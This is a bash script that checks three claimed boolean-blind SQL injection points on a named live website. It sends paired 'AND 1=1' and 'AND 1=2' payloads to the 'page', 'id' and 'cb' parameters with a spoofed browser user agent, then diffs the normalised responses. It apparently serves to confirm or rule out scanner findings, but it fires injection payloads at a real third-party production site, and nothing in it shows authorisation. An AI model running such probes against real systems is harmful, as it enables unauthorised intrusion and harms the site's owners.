#!/bin/bash
# Verify the three claimed boolean-blind SQLi differentials.
# For a real boolean-blind SQLi the TRUE/FALSE variants must differ in body.
# We normalise away the Vercel request id and cache-busting headers before diffing.
T="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
AC="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"

grab () {
  local out="$1"; shift
  timeout 25 curl -sk -A "$UA" -H "Accept: $AC" -H "Accept-Language: en-US,en;q=0.9" \
    -H "Accept-Encoding: gzip, deflate, br" --compressed \
    -o "$out.raw" -w "%{http_code} %{size_download} %{content_type}\n" "$@"
}

norm () {
  # strip volatile tokens: vercel request id, etag, date, script nonces
  sed -E 's/bom1::[a-z0-9-]+//g; s/vercel[0-9]{6,}/vercelX/g; s/"[A-Fa-f0-9]{20,}"/"ETAG"/g' "$1" | tr -d '\n\r'
}

echo "########## CLAIM 1: sqli in 'page' at / ##########"
grab /tmp/p_base "https://www.infinitycapital.bh/?page=2"
grab /tmp/p_true  "https://www.infinitycapital.bh/?page=2%20AND%201=1"
grab /tmp/p_false "https://www.infinitycapital.bh/?page=2%20AND%201=2"
norm /tmp/p_base.raw > /tmp/n_base; norm /tmp/p_true.raw > /tmp/n_true; norm /tmp/p_false.raw > /tmp/n_false
echo "base-vs-TRUE  : $(cmp -s /tmp/n_base /tmp/n_true && echo IDENTICAL || echo DIFFER)"
echo "TRUE-vs-FALSE : $(cmp -s /tmp/n_true /tmp/n_false && echo IDENTICAL || echo DIFFER)"
echo "TRUE bytes=$(wc -c < /tmp/n_true)  FALSE bytes=$(wc -c < /tmp/n_false)"

echo
echo "########## CLAIM 2: sqli in 'id' at /api/ ##########"
grab /tmp/i_base "https://www.infinitycapital.bh/api/?id=1"
grab /tmp/i_true  "https://www.infinitycapital.bh/api/?id=1%20AND%201=1"
grab /tmp/i_false "https://www.infinitycapital.bh/api/?id=1%20AND%201=2"
norm /tmp/i_base.raw > /tmp/m_base; norm /tmp/i_true.raw > /tmp/m_true; norm /tmp/i_false.raw > /tmp/m_false
echo "base-vs-TRUE  : $(cmp -s /tmp/m_base /tmp/m_true && echo IDENTICAL || echo DIFFER)"
echo "TRUE-vs-FALSE : $(cmp -s /tmp/m_true /tmp/m_false && echo IDENTICAL || echo DIFFER)"
echo "TRUE bytes=$(wc -c < /tmp/m_true)  FALSE bytes=$(wc -c < /tmp/m_false)"
echo "--- true body head ---"; head -c 300 /tmp/i_true.raw
echo
echo "########## CLAIM 3: sqli in 'cb' at /contact ##########"
grab /tmp/c_base "https://www.infinitycapital.bh/contact?cb=1"
grab /tmp/c_true  "https://www.infinitycapital.bh/contact?cb=1%20AND%201=1"
grab /tmp/c_false "https://www.infinitycapital.bh/contact?cb=1%20AND%201=2"
norm /tmp/c_base.raw > /tmp/k_base; norm /tmp/c_true.raw > /tmp/k_true; norm /tmp/c_false.raw > /tmp/k_false
echo "base-vs-TRUE  : $(cmp -s /tmp/k_base /tmp/k_true && echo IDENTICAL || echo DIFFER)"
echo "TRUE-vs-FALSE : $(cmp -s /tmp/k_true /tmp/k_false && echo IDENTICAL || echo DIFFER)"
echo "TRUE bytes=$(wc -c < /tmp/k_true)  FALSE bytes=$(wc -c < /tmp/k_false)"
echo "DONE"
